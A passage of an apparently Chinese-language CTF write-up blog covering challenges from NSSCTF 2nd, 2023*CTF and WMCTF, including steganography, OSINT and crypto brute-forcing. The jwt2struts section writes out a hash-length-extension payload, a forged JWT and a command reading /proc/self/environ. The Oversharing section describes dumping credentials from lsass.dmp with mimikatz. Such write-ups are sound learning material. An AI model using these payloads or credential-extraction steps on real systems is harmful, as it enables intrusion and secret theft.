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&#x27;</span><br>    target = getTarget(rec)<br>    <span class="hljs-built_in">print</span>(target)<br><span class="hljs-comment">#[227, 19, 102, 10, 150, 150, 220, 227, 58, 162, 132, 38, 149, 137, 242, 205, 8, 7, 17, 200]</span><br><span class="hljs-comment">#81</span><br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686846.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="magic-docker">Magic Docker</h2><p><code>docker run randark/nssctf-round15-magic-docker</code></p><p>pull下来后提示need secret</p><figure><img src="/img/NSSCTF%202nd/17006210686847.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bash进入就行</p><figure><img src="/img/NSSCTF%202nd/17006210686848.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>/app下有main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> click<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-meta">@click.command()</span><br><span class="hljs-meta">@click.option(<span class="hljs-params"><span class="hljs-string">&#x27;--secret&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">secret</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(secret)==<span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;How dare you! &quot;</span>)<br><br>BANNER=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span><br><span class="hljs-string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span><br><span class="hljs-string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span><br><span class="hljs-string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span><br><span class="hljs-string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           </span><br><span class="hljs-string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span><br><span class="hljs-string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span><br><span class="hljs-string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span><br><span class="hljs-string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span><br><span class="hljs-string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span><br><span class="hljs-string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.system(<span class="hljs-string">&quot;rm -f /flag&quot;</span>)<br>    <span class="hljs-built_in">print</span>(BANNER)<br>    random.seed(<span class="hljs-string">&quot;NSSCTF 2nd&quot;</span>)<br>    answer=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need to give me the secret!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        func()<br></code></pre></td></tr></table></figure><p>可以看到启动docker后就会删掉flag，但是这前面func好像没什么用</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023*CTF</title>
    <link href="/2023/08/27/2023starCTF/"/>
    <url>/2023/08/27/2023starCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf">2023*CTF</h1><h2 id="web"><strong>web</strong></h2><h3 id="jwt2struts"><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：https://blog.csdn.net/LYJ20010728/article/details/116779357</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><figure><img src="/img/2023starCTF/16969546245907.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><figure><img src="/img/2023starCTF/16969546245871.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023starCTF/16969546245882.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><figure><img src="/img/2023starCTF/16969546245883.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023starCTF/16969546245884.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="misc"><strong>misc</strong></h2><h3 id="snippingtools"><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p>https://github.com/frankthetank-music/Acropalypse-Multi-Tool</p><figure><img src="/img/2023starCTF/16969546245885.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="old-language"><strong>old language</strong></h3><p>谷歌识图</p><p><ahref="https://zh.fonts2u.com/dovahkiin.字体">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><figure><img src="/img/2023starCTF/16969546245886.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023WMCTF</title>
    <link href="/2023/08/27/2023WMCTF/"/>
    <url>/2023/08/27/2023WMCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="misc"><strong>MISC</strong></h2><h3 id="find-me"><strong>find me</strong></h3><figure><img src="/img/2023WMCTF/170062069180316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提示在Reddit发了动态</p><p>通过相关搜索发现帖子 https://www.reddit.com/user/WearyMeadow/</p><figure><img src="/img/2023WMCTF/17006206917691.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>base64解码得到 https://ufile.io/670unszp，下载了一个流量包，里面有几个验证过程，找到密钥：mysecretkey，但不知道加解密实现方法</p><p>在刚刚的图片发现头像是github风格的头像，在github找到几个仓库</p><p>其中有一个是博客https://wearymeadow.icu/，里面有一篇加密的文章，里面是流量包的加解密方法</p><figure><img src="/img/2023WMCTF/17006206917692.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>不知道密码，在仓库中注意到了autoAuth，看到有个密码，密码复用</p><figure><img src="/img/2023WMCTF/17006206917693.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开博客发现加解密方法</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message, key</span>):<br>    seed  = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.seed(seed)<br>    encrypted = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    encrypted = cipher.encrypt(pad(encrypted))<br>    <span class="hljs-keyword">return</span> encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># Still working on this...</span><br>    <span class="hljs-keyword">pass</span><br>...<br></code></pre></td></tr></table></figure><p>爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># AES解密</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># 爆破seed生成相同随机数</span><br>    <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):<br>        random.seed(seed)<br>        res = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>            res += <span class="hljs-built_in">bytes</span>([decrypted[i]^random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;WMCTF&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&#x27;</span>)<br>key = pad(<span class="hljs-string">b&#x27;mysecretkey&#x27;</span>) <br>decrypt(ciphertext, key)<br><span class="hljs-comment">#b&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;\xb0.T\x80&amp;\xb5\xb1\x1epGZ)\xbe6\xc8\xcc&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="fantastic-terminal"><strong>Fantastic terminal</strong></h3><p>起一个docker ，<code>docker-compose up -d</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls</span><br>root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cat challenge</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023WMCTF/17006206917694.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="oversharing"><strong>Oversharing</strong></h3><p>题目容器是ssh，给了流量包里有smb协议，导出smb可以发现有lsass.dmp</p><figure><img src="/img/2023WMCTF/17006206917705.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>mimikatz提出密码</p><figure><img src="/img/2023WMCTF/17006206917706.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到ssh密码，ssh登录cat flag即可</p><h2 id="steg"><strong>Steg</strong></h2><h3 id="ez_v1deo"><strong>EZ_v1deo</strong></h3><p>题目：视频好像被L1near弄坏掉了♂</p><p>当时一直以为是视频缺少了一段或者损坏了，在这个方向上浪费好多时间</p><p>最后用ffmpeg将每一帧提取出来，试了一下lsb，结果发现有隐写</p><p><code>ffmpeg -i flag.avi ./%4d.png</code></p><p>这样提取出210帧，每隔4、5帧有是相同的帧，stegsolve逐个看</p><p>还可以写脚本生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment">#提取最低有效位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_lsb</span>(<span class="hljs-params">frame</span>):<br>    <span class="hljs-keyword">return</span> frame &amp; <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">input_video, output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;XVID&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#循环读帧</span><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#提取最低每一帧最低有效位到新帧，写入</span><br>        lsb_frame = extract_lsb(frame) * (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>        out.write(lsb_frame.astype(np.uint8))<br>        <br>    cap.release()<br>    out.release()<br>    cv2.destroyAllWindows()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    input_video = <span class="hljs-string">&#x27;flag.avi&#x27;</span><br>    output_video = <span class="hljs-string">&#x27;new.avi&#x27;</span><br>    main(input_video, output_video)<br></code></pre></td></tr></table></figure><h3 id="mondy-left-me-broken"><strong>Mondy left me Broken</strong></h3><p>看着wp做的</p><p>首先，猫脸变换</p><figure><img src="/img/2023WMCTF/17006206917707.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对于广义的猫脸变换</p><figure><img src="/img/2023WMCTF/17006206917708.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到其逆变换公式，通过以下脚本爆破出a，b</p><p>得到a=5，b=5，还原视频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-comment"># #爆破a,b</span><br><span class="hljs-comment"># im = Image.open(&#x27;final.jpg&#x27;)</span><br><span class="hljs-comment"># im = np.array(im)</span><br><br><span class="hljs-comment"># def 